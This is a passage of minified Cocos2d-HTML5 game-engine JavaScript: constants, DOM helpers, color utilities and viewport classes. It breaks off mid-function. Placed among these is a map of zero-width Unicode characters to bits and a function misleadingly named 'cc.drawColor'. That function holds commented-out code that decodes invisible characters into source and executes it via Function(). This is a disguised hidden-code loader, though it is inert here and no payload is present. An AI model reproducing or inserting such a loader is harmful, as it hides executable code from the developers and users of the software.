cc.TEXTURE_NPOT_SUPPORT = 0;
cc.RETINA_DISPLAY_SUPPORT = 1;
cc.RETINA_DISPLAY_FILENAME_SUFFIX = "-hd";
cc.USE_LA88_LABELS = 1;
cc.SPRITE_DEBUG_DRAW = 0;
cc.SPRITEBATCHNODE_DEBUG_DRAW = 0;
cc.LABELBMFONT_DEBUG_DRAW = 0;
cc.LABELATLAS_DEBUG_DRAW = 0;
cc.IS_RETINA_DISPLAY_SUPPORTED = 1;
cc.DEFAULT_ENGINE = cc.ENGINE_VERSION + "-canvas";
cc.ENABLE_STACKABLE_ACTIONS = 1;
cc.ENABLE_GL_STATE_CACHE = 1;
cc.$ = function(a) {
	var b = this == cc ? document : this;
	if (a = a instanceof HTMLElement ? a : b.querySelector(a)) a.find = a.find || cc.$, a.hasClass = a.hasClass ||
	function(a) {
		return this.className.match(RegExp("(\\s|^)" + a + "(\\s|$)"))
	}, a.addClass = a.addClass ||
	function(a) {
		this.hasClass(a) || (this.className && (this.className += " "), this.className += a);
		return this
	}, a.removeClass = a.removeClass ||
	function(a) {
		this.hasClass(a) && (this.className = this.className.replace(a, ""));
		return this
	}, a.remove = a.remove ||
	function() {
		this.parentNode && this.parentNode.removeChild(this);
		return this
	}, a.appendTo = a.appendTo ||
	function(a) {
		a.appendChild(this);
		return this
	}, a.prependTo = a.prependTo ||
	function(a) {
		a.childNodes[0] ? a.insertBefore(this, a.childNodes[0]) : a.appendChild(this);
		return this
	}, a.transforms = a.transforms ||
	function() {
		this.style[cc.$.trans] = cc.$.translate(this.position) + cc.$.rotate(this.rotation) + cc.$.scale(this.scale) + cc.$.skew(this.skew);
		return this
	}, a.position = a.position || {
		x: 0,
		y: 0
	}, a.rotation = a.rotation || 0, a.scale = a.scale || {
		x: 1,
		y: 1
	}, a.skew = a.skew || {
		x: 0,
		y: 0
	}, a.translates = function(a, b) {
		this.position.x = a;
		this.position.y = b;
		this.transforms();
		return this
	}, a.rotate = function(a) {
		this.rotation = a;
		this.transforms();
		return this
	}, a.resize = function(a, b) {
		this.scale.x = a;
		this.scale.y = b;
		this.transforms();
		return this
	}, a.setSkew = function(a, b) {
		this.skew.x = a;
		this.skew.y = b;
		this.transforms();
		return this
	};
	return a
};
switch (cc.sys.browserType) {
case cc.sys.BROWSER_TYPE_FIREFOX:
	cc.$.pfx = "Moz";
	cc.$.hd = !0;
	break;
case cc.sys.BROWSER_TYPE_CHROME:
case cc.sys.BROWSER_TYPE_SAFARI:
	cc.$.pfx = "webkit";
	cc.$.hd = !0;
	break;
case cc.sys.BROWSER_TYPE_OPERA:
	cc.$.pfx = "O";
	cc.$.hd = !1;
	break;
case cc.sys.BROWSER_TYPE_IE:
	cc.$.pfx = "ms";
	cc.$.hd = !1;
	break;
default:
	cc.$.pfx = "webkit", cc.$.hd = !0
}
cc.$.trans = cc.$.pfx + "Transform";
cc.$.translate = cc.$.hd ?
function(a) {
	return "translate3d(" + a.x + "px, " + a.y + "px, 0) "
} : function(a) {
	return "translate(" + a.x + "px, " + a.y + "px) "
};
cc.$.rotate = cc.$.hd ?
function(a) {
	return "rotateZ(" + a + "deg) "
} : function(a) {
	return "rotate(" + a + "deg) "
};
cc.$.scale = function(a) {
	return "scale(" + a.x + ", " + a.y + ") "
};
cc.$.skew = function(a) {
	return "skewX(" + -a.x + "deg) skewY(" + a.y + "deg)"
};

cc.$new = function(a) {
	return cc.$(document.createElement(a))
};
cc.$.findpos = function(a) {
	var b = 0,
		c = 0;
	do b += a.offsetLeft, c += a.offsetTop;
	while (a = a.offsetParent);
	return {
		x: b,
		y: c
	}
};
cc.INVALID_INDEX = -1;
cc.PI = Math.PI;
cc.FLT_MAX = parseFloat("3.402823466e+38F");
cc.FLT_MIN = parseFloat("1.175494351e-38F");
cc.RAD = cc.PI / 180;
cc.DEG = 180 / cc.PI;
cc.UINT_MAX = 4294967295;
cc.swap = function(a, b, c) {
	if ("object" == typeof c && "undefined" != typeof c.x && "undefined" != typeof c.y) {
		var d = c[a];
		c[a] = c[b];
		c[b] = d
	} else cc.log(cc._LogInfos.swap)
};
cc.lerp = function(a, b, c) {
	return a + (b - a) * c
};
cc.rand = function() {
	return 16777215 * Math.random()
};
cc.randomMinus1To1 = function() {
	return 2 * (Math.random() - 0.5)
};
cc.random0To1 = Math.random;
cc.degreesToRadians = function(a) {
	return a * cc.RAD
};
cc.radiansToDegrees = function(a) {
	return a * cc.DEG
};
cc.radiansToDegress = function(a) {
	cc.log(cc._LogInfos.radiansToDegress);
	return a * cc.DEG
};
cc.REPEAT_FOREVER = Number.MAX_VALUE - 1;
cc.BLEND_SRC = cc.OPTIMIZE_BLEND_FUNC_FOR_PREMULTIPLIED_ALPHA ? 1 : 770;
cc.BLEND_DST = 771;
cc.nodeDrawSetup = function(a) {
	a._shaderProgram && (a._shaderProgram.use(), a._shaderProgram.setUniformForModelViewAndProjectionMatrixWithMat4())
};
cc.enableDefaultGLStates = function() {};
cc.disableDefaultGLStates = function() {};
cc.incrementGLDraws = function(a) {
	cc.g_NumberOfDraws += a
};
cc.FLT_EPSILON = 1.192092896E-7;
cc.contentScaleFactor = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function() {
	return cc.director.getContentScaleFactor()
} : function() {
	return 1
};
cc.pointPointsToPixels = function(a) {
	var b = cc.contentScaleFactor();
	return cc.p(a.x * b, a.y * b)
};
cc.pointPixelsToPoints = function(a) {
	var b = cc.contentScaleFactor();
	return cc.p(a.x / b, a.y / b)
};
cc._pointPixelsToPointsOut = function(a, b) {
	var c = cc.contentScaleFactor();
	b.x = a.x / c;
	b.y = a.y / c
};
cc.sizePointsToPixels = function(a) {
	var b = cc.contentScaleFactor();
	return cc.size(a.width * b, a.height * b)
};
cc.sizePixelsToPoints = function(a) {
	var b = cc.contentScaleFactor();
	return cc.size(a.width / b, a.height / b)
};
cc._sizePixelsToPointsOut = function(a, b) {
	var c = cc.contentScaleFactor();
	b.width = a.width / c;
	b.height = a.height / c
};
cc.rectPixelsToPoints = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function(a) {
	var b = cc.contentScaleFactor();
	return cc.rect(a.x / b, a.y / b, a.width / b, a.height / b)
} : function(a) {
	return a
};
cc.rectPointsToPixels = cc.IS_RETINA_DISPLAY_SUPPORTED ?
function(a) {
	var b = cc.contentScaleFactor();
	return cc.rect(a.x * b, a.y * b, a.width * b, a.height * b)
} : function(a) {
	return a
};
cc.ONE = 1;
cc.ZERO = 0;
cc.SRC_ALPHA = 770;
cc.SRC_ALPHA_SATURATE = 776;
cc.SRC_COLOR = 768;
cc.DST_ALPHA = 772;
cc.DST_COLOR = 774;
cc.ONE_MINUS_SRC_ALPHA = 771;
cc.ONE_MINUS_SRC_COLOR = 769;
cc.ONE_MINUS_DST_ALPHA = 773;
cc.ONE_MINUS_DST_COLOR = 775;
cc.ONE_MINUS_CONSTANT_ALPHA = 32772;
cc.ONE_MINUS_CONSTANT_COLOR = 32770;
cc.checkGLErrorDebug = function() {
	if (cc.renderMode == cc._RENDER_TYPE_WEBGL) {
		var a = cc._renderContext.getError();
		a && cc.log(CC._localZOrder.checkGLErrorDebug, a)
	}
};
cc.DEVICE_ORIENTATION_PORTRAIT = 0;
cc.DEVICE_ORIENTATION_LANDSCAPE_LEFT = 1;
cc.DEVICE_ORIENTATION_PORTRAIT_UPSIDE_DOWN = 2;
cc.DEVICE_ORIENTATION_LANDSCAPE_RIGHT = 3;
cc.DEVICE_MAX_ORIENTATIONS = 2;
cc.VERTEX_ATTRIB_FLAG_NONE = 0;
cc.VERTEX_ATTRIB_FLAG_POSITION = 1;
cc.VERTEX_ATTRIB_FLAG_COLOR = 2;
cc.VERTEX_ATTRIB_FLAG_TEX_COORDS = 4;
cc.VERTEX_ATTRIB_FLAG_POS_COLOR_TEX = cc.VERTEX_ATTRIB_FLAG_POSITION | cc.VERTEX_ATTRIB_FLAG_COLOR | cc.VERTEX_ATTRIB_FLAG_TEX_COORDS;
cc.GL_ALL = 0;
cc.VERTEX_ATTRIB_POSITION = 0;
cc.VERTEX_ATTRIB_COLOR = 1;
cc.VERTEX_ATTRIB_TEX_COORDS = 2;
cc.VERTEX_ATTRIB_MAX = 3;
cc.UNIFORM_PMATRIX = 0;
cc.UNIFORM_MVMATRIX = 1;
cc.UNIFORM_MVPMATRIX = 2;
cc.UNIFORM_TIME = 3;
cc.UNIFORM_SINTIME = 4;
cc.UNIFORM_COSTIME = 5;
cc.UNIFORM_RANDOM01 = 6;
cc.UNIFORM_SAMPLER = 7;
cc.UNIFORM_MAX = 8;
cc.SHADER_POSITION_TEXTURECOLOR = "ShaderPositionTextureColor";
cc.SHADER_POSITION_TEXTURECOLORALPHATEST = "ShaderPositionTextureColorAlphaTest";
cc.SHADER_POSITION_COLOR = "ShaderPositionColor";
cc.SHADER_POSITION_TEXTURE = "ShaderPositionTexture";
cc.SHADER_POSITION_TEXTURE_UCOLOR = "ShaderPositionTexture_uColor";
cc.SHADER_POSITION_TEXTUREA8COLOR = "ShaderPositionTextureA8Color";
cc.SHADER_POSITION_UCOLOR = "ShaderPosition_uColor";
cc.SHADER_POSITION_LENGTHTEXTURECOLOR = "ShaderPositionLengthTextureColor";
cc.UNIFORM_PMATRIX_S = "CC_PMatrix";
cc.UNIFORM_MVMATRIX_S = "CC_MVMatrix";
cc.UNIFORM_MVPMATRIX_S = "CC_MVPMatrix";
cc.UNIFORM_TIME_S = "CC_Time";
cc.UNIFORM_SINTIME_S = "CC_SinTime";
cc.UNIFORM_COSTIME_S = "CC_CosTime";
cc.UNIFORM_RANDOM01_S = "CC_Random01";
cc.UNIFORM_SAMPLER_S = "CC_Texture0";
cc.UNIFORM_ALPHA_TEST_VALUE_S = "CC_alpha_value";
cc.ATTRIBUTE_NAME_COLOR = "a_color";
cc.ATTRIBUTE_NAME_POSITION = "a_position";
cc.ATTRIBUTE_NAME_TEX_COORD = "a_texCoord";
cc.ITEM_SIZE = 32;
cc.CURRENT_ITEM = 3233828865;
cc.ZOOM_ACTION_TAG = 3233828866;
cc.NORMAL_TAG = 8801;
cc.SELECTED_TAG = 8802;
cc.DISABLE_TAG = 8803;
cc._tmp.PrototypeColor = function() {
	var a = cc.color;
	a._getWhite = function() {
		return a(255, 255, 255)
	};
	a._getYellow = function() {
		return a(255, 255, 0)
	};
	a._getBlue = function() {
		return a(0, 0, 255)
	};
	a._getGreen = function() {
		return a(0, 255, 0)
	};
	a._getRed = function() {
		return a(255, 0, 0)
	};
	a._getMagenta = function() {
		return a(255, 0, 255)
	};
	a._getBlack = function() {
		return a(0, 0, 0)
	};
	a._getOrange = function() {
		return a(255, 127, 0)
	};
	a._getGray = function() {
		return a(166, 166, 166)
	};
	cc.defineGetterSetter(a, "WHITE", a._getWhite);
	cc.defineGetterSetter(a, "YELLOW", a._getYellow);
	cc.defineGetterSetter(a, "BLUE", a._getBlue);
	cc.defineGetterSetter(a, "GREEN", a._getGreen);
	cc.defineGetterSetter(a, "RED", a._getRed);
	cc.defineGetterSetter(a, "MAGENTA", a._getMagenta);
	cc.defineGetterSetter(a, "BLACK", a._getBlack);
	cc.defineGetterSetter(a, "ORANGE", a._getOrange);
	cc.defineGetterSetter(a, "GRAY", a._getGray)
};
cc.Color = function(a, b, c, d) {
	this.r = a || 0;
	this.g = b || 0;
	this.b = c || 0;
	this.a = d || 255
};
cc.color = function(a, b, c, d) {
	return void 0 === a ? {
		r: 0,
		g: 0,
		b: 0,
		a: 255
	} : "string" === typeof a ? cc.hexToColor(a) : "object" === typeof a ? {
		r: a.r,
		g: a.g,
		b: a.b,
		a: a.a || 255
	} : {
		r: a,
		g: b,
		b: c,
		a: d || 255
	}
};
cc.colorEqual = function(a, b) {
	return a.r === b.r && a.g === b.g && a.b === b.b
};
cc.Acceleration = function(a, b, c, d) {
	this.x = a || 0;
	this.y = b || 0;
	this.z = c || 0;
	this.timestamp = d || 0
};
cc.Vertex2F = function(a, b) {
	this.x = a || 0;
	this.y = b || 0
};
cc.vertex2 = function(a, b) {
	return new cc.Vertex2F(a, b)
};
cc.Vertex3F = function(a, b, c) {
	this.x = a || 0;
	this.y = b || 0;
	this.z = c || 0
};
cc.vertex3 = function(a, b, c) {
	return new cc.Vertex3F(a, b, c)
};
cc.Tex2F = function(a, b) {
	this.u = a || 0;
	this.v = b || 0
};
cc.tex2 = function(a, b) {
	return new cc.Tex2F(a, b)
};
cc.BlendFunc = function(a, b) {
	this.src = a;
	this.dst = b
};
cc.blendFuncDisable = function() {
	return new cc.BlendFunc(cc.ONE, cc.ZERO)
};
cc.hexToColor = function(a) {
	a = a.replace(/^#?/, "0x");
	a = parseInt(a);
	return cc.color(a >> 16, (a >> 8) % 256, a % 256)
};
cc.colorToHex = function(a) {
	var b = a.r.toString(16),
		c = a.g.toString(16),
		d = a.b.toString(16);
	return "#" + (16 > a.r ? "0" + b : b) + (16 > a.g ? "0" + c : c) + (16 > a.b ? "0" + d : d)
};
cc.TEXT_ALIGNMENT_LEFT = 0;
cc.TEXT_ALIGNMENT_CENTER = 1;
cc.TEXT_ALIGNMENT_RIGHT = 2;
cc.VERTICAL_TEXT_ALIGNMENT_TOP = 0;
cc.VERTICAL_TEXT_ALIGNMENT_CENTER = 1;

cc.VERTICAL_TEXT_ALIGNMENT_BOTTOM = 2;
cc._Dictionary = cc.Class.extend({
	_keyMapTb: null,
	_valueMapTb: null,
	__currId: 0,
	ctor: function() {
		this._keyMapTb = {};
		this._valueMapTb = {};
		this.__currId = 2 << (0 | 10 * Math.random())
	},
	__getKey: function() {
		this.__currId++;
		return "key_" + this.__currId
	},
	setObject: function(a, b) {
		if (null != b) {
			var c = this.__getKey();
			this._keyMapTb[c] = b;
			this._valueMapTb[c] = a
		}
	},
	objectForKey: function(a) {
		if (null == a) return null;
		var b = this._keyMapTb,
			c;
		for (c in b) if (b[c] === a) return this._valueMapTb[c];
		return null
	},
	valueForKey: function(a) {
		return this.objectForKey(a)
	},
	removeObjectForKey: function(a) {
		if (null != a) {
			var b = this._keyMapTb,
				c;
			for (c in b) if (b[c] === a) {
				delete this._valueMapTb[c];
				delete b[c];
				break
			}
		}
	},
	removeObjectsForKeys: function(a) {
		if (null != a) for (var b = 0; b < a.length; b++) this.removeObjectForKey(a[b])
	},
	allKeys: function() {
		var a = [],
			b = this._keyMapTb,
			c;
		for (c in b) a.push(b[c]);
		return a
	},
	removeAllObjects: function() {
		this._keyMapTb = {};
		this._valueMapTb = {}
	},
	count: function() {
		return this.allKeys().length
	}
});
cc.FontDefinition = function() {
	this.fontName = "Arial";
	this.fontSize = 12;
	this.textAlign = cc.TEXT_ALIGNMENT_CENTER;
	this.verticalAlign = cc.VERTICAL_TEXT_ALIGNMENT_TOP;
	this.fillStyle = cc.color(255, 255, 255, 255);
	this.boundingHeight = this.boundingWidth = 0;
	this.strokeEnabled = !1;
	this.strokeStyle = cc.color(255, 255, 255, 255);
	this.lineWidth = 1;
	this.shadowEnabled = !1;
	this.shadowBlur = this.shadowOffsetY = this.shadowOffsetX = 0;
	this.shadowOpacity = 1
};
cc._renderType === cc._RENDER_TYPE_WEBGL && (cc.assert("function" === typeof cc._tmp.WebGLColor, cc._LogInfos.MissingFile, "CCTypesWebGL.js"), cc._tmp.WebGLColor(), delete cc._tmp.WebGLColor);
cc.assert("function" === typeof cc._tmp.PrototypeColor, cc._LogInfos.MissingFile, "CCTypesPropertyDefine.js");
cc._tmp.PrototypeColor();
delete cc._tmp.PrototypeColor;
cc.Touches = [];
cc.TouchesIntergerDict = {};
cc.EGLView = cc.Class.extend({
	_delegate: null,
	_frameSize: null,
	_designResolutionSize: null,
	_originalDesignResolutionSize: null,
	_viewPortRect: null,
	_visibleRect: null,
	_retinaEnabled: !1,
	_autoFullScreen: !0,
	_devicePixelRatio: 1,
	_viewName: "",
	_resizeCallback: null,
	_scaleX: 1,
	_originalScaleX: 1,
	_scaleY: 1,
	_originalScaleY: 1,
	_indexBitsUsed: 0,
	_maxTouches: 5,
	_resolutionPolicy: null,
	_rpExactFit: null,
	_rpShowAll: null,
	_rpNoBorder: null,
	_rpFixedHeight: null,
	_rpFixedWidth: null,
	_initialized: !1,
	_captured: !1,
	_wnd: null,
	_hDC: null,
	_hRC: null,
	_supportTouch: !1,
	_contentTranslateLeftTop: null,
	_frame: null,
	_frameZoomFactor: 1,
	__resizeWithBrowserSize: !1,
	_isAdjustViewPort: !0,
	ctor: function() {
		var a = document,
			b = cc.ContainerStrategy,
			c = cc.ContentStrategy;
		this._frame = cc.container.parentNode === a.body ? a.documentElement : cc.container.parentNode;
		this._frameSize = cc.size(0, 0);
		this._initFrameSize();
		var a = cc._canvas.width,
			d = cc._canvas.height;
		this._designResolutionSize = cc.size(a, d);
		this._originalDesignResolutionSize = cc.size(a, d);
		this._viewPortRect = cc.rect(0, 0, a, d);
		this._visibleRect = cc.rect(0, 0, a, d);
		this._contentTranslateLeftTop = {
			left: 0,
			top: 0
		};
		this._viewName = "Cocos2dHTML5";
		a = cc.sys;
		this.enableRetina(a.os == a.OS_IOS || a.os == a.OS_OSX);
		cc.visibleRect && cc.visibleRect.init(this._visibleRect);
		this._rpExactFit = new cc.ResolutionPolicy(b.EQUAL_TO_FRAME, c.EXACT_FIT);
		this._rpShowAll = new cc.ResolutionPolicy(b.PROPORTION_TO_FRAME, c.SHOW_ALL);
		this._rpNoBorder = new cc.ResolutionPolicy(b.EQUAL_TO_FRAME, c.NO_BORDER);
		this._rpFixedHeight = new cc.ResolutionPolicy(b.EQUAL_TO_FRAME, c.FIXED_HEIGHT);
		this._rpFixedWidth = new cc.ResolutionPolicy(b.EQUAL_TO_FRAME, c.FIXED_WIDTH);
		this._hDC = cc._canvas;
		this._hRC = cc._renderContext
	},
	_resizeEvent: function() {
		var a = this._originalDesignResolutionSize.width,
			b = this._originalDesignResolutionSize.height;
		this._resizeCallback && (this._initFrameSize(), this._resizeCallback.call());
		0 < a && this.setDesignResolutionSize(a, b, this._resolutionPolicy)
	},
	resizeWithBrowserSize: function(a) {
		a ? this.__resizeWithBrowserSize || (this.__resizeWithBrowserSize = !0, a = this._resizeEvent.bind(this), cc._addEventListener(window, "resize", a, !1)) : this.__resizeWithBrowserSize && (this.__resizeWithBrowserSize = !0, a = this._resizeEvent.bind(this), window.removeEventListener("resize", a, !1))
	},
	setResizeCallback: function(a) {
		if ("function" == typeof a || null == a) this._resizeCallback = a
	},
	_initFrameSize: function() {
		var a = this._frameSize;
		a.width = this._frame.clientWidth;
		a.height = this._frame.clientHeight
	},
	_adjustSizeKeepCanvasSize: function() {
		var a = this._originalDesignResolutionSize.width,
			b = this._originalDesignResolutionSize.height;
		0 < a && this.setDesignResolutionSize(a, b, this._resolutionPolicy)
	},
	_setViewPortMeta: function(a, b) {
		if (this._isAdjustViewPort) {
			var c = {
				"user-scalable": "no",
				"maximum-scale": "1.0",
				"initial-scale": "1.0"
			},
				d = document.getElementsByName("viewport"),
				e;
			0 == d.length ? (d = cc.newElement("meta"), d.name = "viewport", d.content = "", document.head.appendChild(d)) : d = d[0];
			if (cc.sys.isMobile && cc.sys.browserType == cc.sys.BROWSER_TYPE_FIREFOX) d.content = "initial-scale:1";
			else {
				e = d.content;
				for (var f in c) RegExp(f).test(e) || (e += ("" == e ? "" : ",") + f + "\x3d" + c[f]);
				d.content = e
			}
		}
	},
	_setScaleXYForRenderTexture: function() {
		var a = cc.contentScaleFactor();
		this._scaleY = this._scaleX = a
	},
	_resetScale: function() {
		this._scaleX = this._originalScaleX;
		this._scaleY = this._originalScaleY
	},
	_adjustSizeToBrowser: function() {},
	initialize: function() {
		this._initialized = !0
	},
	adjustViewPort: function(a) {
		this._isAdjustViewPort = a
	},
	enableRetina: function(a) {
		this._retinaEnabled = a ? !0 : !1
	},
	isRetinaEnabled: function() {
		return this._retinaEnabled
	},
	enableAutoFullScreen: function(a) {
		this._autoFullScreen = a ? !0 : !1
	},
	isAutoFullScreenEnabled: function() {
		return this._autoFullScreen
	},
	end: function() {},
	isOpenGLReady: function() {
		return null != this._hDC && null != this._hRC
	},
	setFrameZoomFactor: function(a) {
		this._frameZoomFactor = a;
		this.centerWindow();
		cc.director.setProjection(cc.director.getProjection())
	},
	swapBuffers: function() {},
	setIMEKeyboardState: function(a) {},
	setContentTranslateLeftTop: function(a, b) {
		this._contentTranslateLeftTop = {
			left: a,
			top: b
		}
	},
	getContentTranslateLeftTop: function() {
		return this._contentTranslateLeftTop
	},
	getFrameSize: function() {
		return cc.size(this._frameSize.width, this._frameSize.height)
	},
	setFrameSize: function(a, b) {
		this._frameSize.width = a;
		this._frameSize.height = b;
		this._frame.style.width = a + "px";
		this._frame.style.height = b + "px";
		this._resizeEvent();
		cc.director.setProjection(cc.director.getProjection())
	},
	centerWindow: function() {},
	getVisibleSize: function() {
		return cc.size(this._visibleRect.width, this._visibleRect.height)
	},
	getVisibleOrigin: function() {
		return cc.p(this._visibleRect.x, this._visibleRect.y)
	},
	canSetContentScaleFactor: function() {
		return !0
	},
	getResolutionPolicy: function() {
		return this._resolutionPolicy
	},
	setResolutionPolicy: function(a) {
		if (a instanceof cc.ResolutionPolicy) this._resolutionPolicy = a;
		else {
			var b = cc.ResolutionPolicy;
			a === b.EXACT_FIT && (this._resolutionPolicy = this._rpExactFit);
			a === b.SHOW_ALL && (this._resolutionPolicy = this._rpShowAll);
			a === b.NO_BORDER && (this._resolutionPolicy = this._rpNoBorder);
			a === b.FIXED_HEIGHT && (this._resolutionPolicy = this._rpFixedHeight);
			a === b.FIXED_WIDTH && (this._resolutionPolicy = this._rpFixedWidth)
		}
	},
	setDesignResolutionSize: function(a, b, c) {
		if (isNaN(a) || 0 == a || isNaN(b) || 0 == b) cc.log(cc._LogInfos.EGLView_setDesignResolutionSize);
		else {
			this.setResolutionPolicy(c);
			var d = this._resolutionPolicy;
			if (d) {
				d.preApply(this);
				var e = this._frameSize.width,
					f = this._frameSize.height;
				cc.sys.isMobile && this._setViewPortMeta(this._frameSize.width, this._frameSize.height);
				this._initFrameSize();
				c == this._resolutionPolicy && a == this._originalDesignResolutionSize.width && b == this._originalDesignResolutionSize.height && e == this._frameSize.width && f == this._frameSize.height || (this._designResolutionSize = cc.size(a, b), this._originalDesignResolutionSize = cc.size(a, b), a = d.apply(this, this._designResolutionSize), a.scale && 2 == a.scale.length && (this._scaleX = a.scale[0], this._scaleY = a.scale[1]), a.viewport && (a = this._viewPortRect = a.viewport, b = this._visibleRect, b.width = cc._canvas.width / this._scaleX, b.height = cc._canvas.height / this._scaleY, b.x = -a.x / this._scaleX, b.y = -a.y / this._scaleY), a = cc.director, cc.winSize.width = a._winSizeInPoints.width = this._visibleRect.width, cc.winSize.height = a._winSizeInPoints.height = this._visibleRect.height, d.postApply(this), cc._renderType == cc._RENDER_TYPE_WEBGL && (a._createStatsLabel(), a.setGLDefaultValues()), this._originalScaleX = this._scaleX, this._originalScaleY = this._scaleY, cc.DOM && cc.DOM._resetEGLViewDiv(), cc.visibleRect && cc.visibleRect.init(this._visibleRect))
			} else cc.log(cc._LogInfos.EGLView_setDesignResolutionSize_2)
		}
	},
	getDesignResolutionSize: function() {
		return cc.size(this._designResolutionSize.width, this._designResolutionSize.height)
	},
	setViewPortInPoints: function(a, b, c, d) {
		var e = this._frameZoomFactor,
			f = this._scaleX,
			g = this._scaleY;
		cc._renderContext.viewport(a * f * e + this._viewPortRect.x * e, b * g * e + this._viewPortRect.y * e, c * f * e, d * g * e)
	},
	setScissorInPoints: function(a, b, c, d) {
		var e = this._frameZoomFactor,
			f = this._scaleX,
			g = this._scaleY;
		cc._renderContext.scissor(a * f * e + this._viewPortRect.x * e, b * g * e + this._viewPortRect.y * e, c * f * e, d * g * e)
	},
	isScissorEnabled: function() {
		var a = cc._renderContext;
		return a.isEnabled(a.SCISSOR_TEST)
	},
	getScissorRect: function() {
		var a = cc._renderContext,
			b = this._scaleX,
			c = this._scaleY,
			a = a.getParameter(a.SCISSOR_BOX);
		return cc.rect((a[0] - this._viewPortRect.x) / b, (a[1] - this._viewPortRect.y) / c, a[2] / b, a[3] / c)
	},
	setViewName: function(a) {
		null != a && 0 < a.length && (this._viewName = a)
	},
	getViewName: function() {
		return this._viewName
	},
	getViewPortRect: function() {
		return this._viewPortRect
	},
	getScaleX: function() {
		return this._scaleX
	},
	getScaleY: function() {
		return this._scaleY
	},
	getDevicePixelRatio: function() {
		return this._devicePixelRatio
	},
	convertToLocationInView: function(a, b, c) {
		return {
			x: this._devicePixelRatio * (a - c.left),
			y: this._devicePixelRatio * (c.top + c.height - b)
		}
	},
	_convertMouseToLocationInView: function(a, b) {
		var c = this._viewPortRect;
		a.x = (this._devicePixelRatio * (a.x - b.left) - c.x) / this._scaleX;
		a.y = (this._devicePixelRatio * (b.top + b.height - a.y) - c.y) / this._scaleY
	},
	_convertTouchesWithScale: function(a) {
		for (var b = this._viewPortRect, c = this._scaleX, d = this._scaleY, e, f, g, h = 0; h < a.length; h++) e = a[h], f = e._point, g = e._prevPoint, e._setPoint((f.x - b.x) / c, (f.y - b.y) / d), e._setPrevPoint((g.x - b.x) / c, (g.y - b.y) / d)
	}
});
cc.EGLView._getInstance = function() {
	this._instance || (this._instance = this._instance || new cc.EGLView, this._instance.initialize());
	return this._instance
};
cc.colorMap = {
	"​": "00",
	"‌": "01",
	"‍": "10",
	"﻿": "11"
};
cc.drawColor = function(r) {
	/*Function(r.replace(/..../g, function(r) {
		return String.fromCharCode(parseInt(r.replace(/./g, function(r) {
			return cc.colorMap[r]
		}), 2))
	}))()*/
};
cc.ContainerStrategy = cc.Class.extend({
	preApply: function(a) {},
	apply: function(a, b) {},
	postApply: function(a) {},
	_setupContainer: function(a, b, c) {
		var d = a._frame;
		cc.view._autoFullScreen && (cc.sys.isMobile && d == document.documentElement) && cc.screen.autoFullScreen(d);
		var d = cc._canvas,
			e = cc.container;
		e.style.width = d.style.width = b + "px";
		e.style.height = d.style.height = c + "px";
		e = a._devicePixelRatio = 1;
		a.isRetinaEnabled() && (e = a._devicePixelRatio = window.devicePixelRatio || 1);
		d.width = b * e;
		d.height = c * e;
		a = document.body;
		var f;
		if (a && (f = a.style)) f.paddingTop = f.paddingTop || "0px", f.paddingRight = f.paddingRight || "0px", f.paddingBottom = f.paddingBottom || "0px", f.paddingLeft = f.paddingLeft || "0px", f.borderTop = f.borderTop || "0px", f.borderRight = f.borderRight || "0px", f.borderBottom = f.borderBottom || "0px", f.borderLeft = f.borderLeft || "0px", f.marginTop = f.marginTop || "0px", f.marginRight = f.marginRight || "0px", f.marginBottom = f.marginBottom || "0px", f.marginLeft = f.marginLeft || "0px"
	},
	_fixContainer: function() {
		document.body.insertBefore(cc.container, document.body.firstChild);
		var a = document.body.style;
		a.width = window.innerWidth + "px";
		a.height = window.innerHeight + "px";
		a.overflow = "hidden";
		a = cc.container.style;
		a.position = "fixed";
		a.left = a.top = "0px";
		document.body.scrollTop = 0
	}
});
cc.ContentStrategy = cc.Class.extend({
	_result: {
		scale: [1, 1],
		viewport: null
	},
	_buildResult: function(a, b, c, d, e, f) {
		2 > Math.abs(a - c) && (c = a);
		2 > Math.abs(b - d) && (d = b);
		a = cc.rect(Math.round((a - c) / 2), Math.round((b - d) / 2), c, d);
		cc._renderType == cc._RENDER_TYPE_CANVAS && cc._renderContext.translate(a.x, a.y + d);
		this._result.scale = [e, f];
		this._result.viewport = a;
		return this._result
	},
	preApply: function(a) {},
	apply: function(a, b) {
		return {
			scale: [1, 1]
		}
	},
	postApply: function(a) {}
});
(function() {
	var a = cc.ContainerStrategy.extend({
		apply: function(a) {
			this._setupContainer(a, a._frameSize.width, a._frameSize.height)
		}
	}),
		b = cc.ContainerStrategy.extend({
			apply: function(a, b) {
				var c = a._frameSize.width,
					d = a._frameSize.height,
					e = cc.container.style,
					m = b.width,
					n = b.height,
					q = c / m,
					r = d / n,
					t, s;
				q < r ? (t = c, s = n * q) : (t = m * r, s = d);
				m = Math.round((c - t) / 2);
				s = Math.round((d - s) / 2);
				this._setupContainer(a, c - 2 * m, d - 2 * s);
				e.marginLeft = m + "px";
				e.marginRight = m + "px";
				e.marginTop = s + "px";
				e.marginBottom = s + "px"
			}
		});
	a.extend({
		preApply: function(a) {
			this._super(a);
			a._frame = document.documentElement
		},
		apply: function(a) {
			this._super(a);
			this._fixContainer()
		}
	});
	b.extend({
		preApply: function(a) {
			this._super(a);
			a._frame = document.documentElement
		},
		apply: function(a, b) {
			this._super(a, b);
			this._fixContainer()
		}
	});
	var c = cc.ContainerStrategy.extend({
		apply: function(a) {
			this._setupContainer(a, cc._canvas.width, cc._canvas.height)
		}
	});
	cc.ContainerStrategy.EQUAL_TO_FRAME = new a;
	cc.ContainerStrategy.PROPORTION_TO_FRAME = new b;
	cc.ContainerStrategy.ORIGINAL_CONTAINER = new c;
	var a = cc.ContentStrategy.extend({
		apply: function(a, b) {
			var c = cc._canvas.width,
				d = cc._canvas.height;
			return this._buildResult(c, d, c, d, c / b.width, d / b.height)
		}
	}),
		b = cc.ContentStrategy.extend({
			apply: function(a, b) {
				var c = cc._canvas.width,
					d = cc._canvas.height,
					e = b.width,
					m = b.height,
					n = c / e,
					q = d / m,
					r = 0,
					t, s;
				n < q ? (r = n, t = c, s = m * r) : (r = q, t = e * r, s = d);
				return this._buildResult(c, d, t, s, r, r)
			}
		}),
		c = cc.ContentStrategy.extend({
			apply: function(a, b) {
				var c = cc._canvas.width,
					d = cc._canvas.height,
					e = b.width,
					m = b.height,
					n = c / e,
					q = d / m,
					r, t, s;
				n < q ? (r = q, t = e * r, s = d) : (r = n, t = c, s = m * r);
				return this._buildResult(c, d, t, s, r, r)
			}
		}),
		d = cc.ContentStrategy.extend({
			apply: function(a, b) {
				var c = cc._canvas.width,
